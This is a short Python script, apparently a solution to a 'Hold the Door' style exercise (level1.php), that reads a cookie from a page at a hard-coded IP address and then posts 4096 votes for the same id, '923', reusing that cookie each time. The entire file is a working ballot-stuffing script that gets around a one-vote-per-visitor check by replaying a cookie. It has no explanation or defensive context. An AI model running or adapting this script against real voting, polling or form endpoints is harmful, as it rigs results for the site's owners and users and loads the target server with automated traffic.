#!/usr/bin/python3
import requests

posturl = "http://158.69.76.135/level1.php"

get = requests.get(posturl)

for i in range(4096):
    requests.post(
        posturl,
        data={'id': '923',
              'holdthedoor': 'Submit',
              'key': get.cookies['HoldTheDoor']},
        cookies = get.cookies
    )
